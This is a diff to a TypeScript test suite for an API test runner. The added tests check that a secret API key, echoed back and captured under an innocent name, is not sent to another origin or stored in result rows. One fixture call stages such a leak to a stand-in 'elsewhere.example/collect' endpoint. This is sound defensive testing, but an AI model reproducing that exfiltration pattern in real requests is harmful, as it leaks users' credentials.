@@ -7,10 +7,14 @@ import {
   operationFingerprint,
   readTestFixture,
   runTestPlan,
+  storableRunResults,
   suitePrerequisites,
   testChain,
   testRunPlan,
+  type TestRunCall,
+  type TestRunPlan,
   type TestRunRequest,
+  type TestRunTarget,
   testCaseRequest,
   testCasesFor,
   testSuiteCurl,
@@ -443,6 +447,70 @@ describe('runTestPlan', () => {
     expect(request.headers.map((h) => h.name)).toEqual(['Content-Type']);
     expect(JSON.parse(request.body!)).toEqual({ note: 'say "hi"' });
     expect(fillRunRequest({ method: 'GET', url: '/{{gone}}', headers: [], body: null }, {}).missing).toEqual(['gone']);
+  });
+
+  // #1103: a guarded value laundered through a capture under an innocent name.
+  describe('a capture taken from a request a secret filled', () => {
+    const target = (server: string): TestRunTarget => ({ documentId: 'spec', revisionId: 'r1', entityKey: 'op', server });
+    const call = (id: string, server: string, url: string, capture: Record<string, string> = {}): TestRunCall => ({
+      id,
+      kind: 'call',
+      label: id,
+      target: target(server),
+      request: { method: 'GET', url: `${server}${url}`, headers: [], body: null },
+      expect: '200',
+      capture,
+    });
+    const OWN = 'https://own.example';
+    const ELSEWHERE = 'https://elsewhere.example';
+    const tainted: TestRunPlan = {
+      documentId: 'spec',
+      entityKey: 'op',
+      title: 't',
+      setup: [
+        call('echo', OWN, '/echo?k={{secret.apiKey}}', { reflected: '$.echo' }),
+        call('clean', OWN, '/id', { invoiceId: '$.id' }),
+        call('same-origin', OWN, '/use?v={{reflected}}'),
+        call('leak', ELSEWHERE, '/collect?v={{reflected}}&id={{invoiceId}}'),
+      ],
+      cases: [],
+      teardown: [],
+      inputs: {},
+      secrets: ['secret.apiKey'],
+    };
+    const guarded = { values: { 'secret.apiKey': 'S3CRET' }, allow: (_t: TestRunTarget, url: string) => new URL(url).origin === OWN };
+    const run = async () => {
+      const sent: string[] = [];
+      const results = await runTestPlan(tainted, {}, async (_k, _t, r) => {
+        sent.push(r.url);
+        const k = new URL(r.url).searchParams.get('k');
+        return { status: 200, headers: [], body: JSON.stringify({ echo: k, id: 'inv_1' }) };
+      }, undefined, undefined, guarded);
+      return { sent, results };
+    };
+
+    it('goes only where the secret may go', async () => {
+      const { sent, results } = await run();
+      expect(results.get('setup/same-origin')!.outcome).toBe('pass');
+      expect(results.get('setup/leak')).toMatchObject({ outcome: 'error', reason: 'withheld:reflected' });
+      expect(sent.some((u) => u.startsWith(ELSEWHERE))).toBe(false);
+      expect(sent.join('\n')).not.toMatch(new RegExp(`${ELSEWHERE}.*S3CRET`));
+    });
+
+    it('is never stored when its value holds a secret, whatever it is called', () => {
+      const row = { outcome: 'pass' as const, status: 200, durationMs: 1, reason: null };
+      const stored = storableRunResults(
+        { 'setup/a': { ...row, captures: { echoed: 'xx-S3CRET-xx', invoiceId: 'inv_1', TOKEN: 'tok' } } },
+        ['S3CRET', ''],
+      );
+      expect(stored['setup/a']!.captures).toEqual({ invoiceId: 'inv_1' });
+    });
+
+    it('is left out of the result row, while a clean capture stays', async () => {
+      const { results } = await run();
+      expect(JSON.stringify([...results.values()])).not.toContain('S3CRET');
+      expect(results.get('setup/clean')!.captures).toEqual({ invoiceId: 'inv_1' });
+    });
   });
 });
 
